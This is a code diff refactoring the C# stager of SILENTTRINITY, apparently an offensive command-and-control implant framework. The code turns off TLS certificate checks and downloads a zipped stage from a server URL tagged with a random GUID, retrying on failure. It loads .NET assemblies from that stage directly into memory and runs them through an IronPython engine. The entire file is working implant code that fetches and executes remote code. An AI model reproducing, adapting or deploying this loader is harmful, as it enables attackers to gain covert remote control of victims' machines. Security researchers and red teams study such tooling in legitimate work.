@@ -4,65 +4,76 @@ using System.IO.Compression;
 using System.Reflection;
 using System.Net;
 using SILENTTRINITY.Utilities;
+using System.Runtime.InteropServices;
 
 namespace SILENTTRINITY
 {
     public class ST
     {
+        static ZipStorer Stage;
+
         static ST()
         {
-            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
-            ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | (SecurityProtocolType)3072;
+            ServicePointManager.ServerCertificateValidationCallback +=
+                                 (sender, cert, chain, sslPolicyErrors) => true;
+           
+             ServicePointManager.SecurityProtocol = (SecurityProtocolType)768 | 
+                                                    (SecurityProtocolType)3072;
 
-            AppDomain.CurrentDomain.AssemblyResolve += STResolveEventHandler;
+            AppDomain.CurrentDomain.AssemblyResolve += ResolveEventHandler;
         }
-
-        static ZipStorer Stage;
 
         public static void Main(string[] args)
         {
             if (args.Length != 1)
             {
-                Console.WriteLine("Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
+                Console.WriteLine("[!] Usage: SILENTTRINITY.exe <URL> [<STAGE_URL>]");
                 Environment.Exit(1);
             }
 
             Guid GUID = Guid.NewGuid();
+
             Uri URL = new Uri(new Uri(args[0]), GUID.ToString());
-
 #if DEBUG
-            Console.WriteLine("URL: {0}", URL);
-            Console.WriteLine();
+            Console.WriteLine("[+] URL: {0}", URL);
 #endif
-            do
+            try
             {
-                Stage = ZipStorer.Open(Engines.IronPython.GetStage(URL),
-                                        FileAccess.ReadWrite, true);
-            } while (Stage == null);
-
-            Engines.IronPython.Run(URL, GUID, Stage);
-        }
-
-        static Assembly STResolveEventHandler(object sender, ResolveEventArgs args)
-        {
-            byte[] bytes = null;
-
-            string DllName = Internals.GetDLLName(args.Name);
-
-            bytes = Internals.GetResourceInZip(Stage, DllName);
-
-            if (bytes == null)
-            { 
-                bytes = File.ReadAllBytes(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + DllName);
+#if DEBUG
+                Console.WriteLine("[+] Trying to get the stage...");
+#endif
+                Stage = ZipStorer.Open(DownloadStage(URL), FileAccess.ReadWrite, true);
+            }
+            catch
+            {
+#if DEBUG
+                Console.WriteLine("\n[!] ERROR: Unable to get the stage.[-]");
+#endif
+                Environment.Exit(-1);
             }
 
-            Assembly asm = Assembly.Load(bytes);
-
 #if DEBUG
-            Console.WriteLine("'{0}' loaded", asm.FullName);
+            Console.WriteLine("[+] Running the Engine...");
 #endif
+            Engines.IronPython.Run(URL, GUID, Stage);        
+        }
 
-            return asm;
+        static Stream DownloadStage(Uri URL, int sleep = 5, int retries = 6) {
+            return Retry.Do<Stream>(() => Engines.IronPython.GetStage(URL),
+                                     TimeSpan.FromSeconds(sleep), retries);
+        }
+
+        static Assembly ResolveEventHandler(object sender, ResolveEventArgs args)
+        {
+            string dllName = Internals.GetDLLName(args.Name);
+
+            byte[] bytes = Internals.GetResourceInZip(Stage, dllName) ??
+                File.ReadAllBytes(RuntimeEnvironment.GetRuntimeDirectory() + dllName);
+                
+#if DEBUG
+            Console.WriteLine("\t[+] '{0}' loaded", dllName);
+#endif
+            return Assembly.Load(bytes);
         }
     }
 }
